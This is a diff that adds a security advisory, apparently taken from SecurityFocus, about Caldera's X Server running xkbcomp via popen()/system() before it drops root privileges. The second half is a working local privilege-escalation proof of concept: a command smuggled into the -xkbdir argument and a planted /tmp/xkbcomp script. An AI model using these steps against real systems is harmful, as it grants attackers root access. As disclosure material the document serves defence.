@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/5575/info
+
+Caldera's X Server implementation invokes external commands without dropping existing privilege levels. Xserver calls xkbcomp, and other related utilities, in an unsecure manner using the popen() or system() calls. While this would not typically be an issue, as execution of the binary would typically result in the execution of code in the security context of the invoking user, the xkbcomp utility is executed by the Xserver process before privileges are dropped.
+
+This weakness can be exploited by local attacker to execute arbitrary commands with elevated privileges. 
+
+$ Xserver -xkbdir 'id > /tmp/I_WAS_HERE;'
+[exit X server]
+$ grep root /tmp/I_WAS_HERE && echo 'Gotcha!'
+
+$ cat > /tmp/xkbcomp
+#!/bin/sh
+id > /tmp/I_WAS_HERE
+[ctrl+d]
+$ chmod a+x /tmp/xkbcomp
+$ Xserver -xkbdir /tmp
+[X server executes /tmp/xkbcomp] 
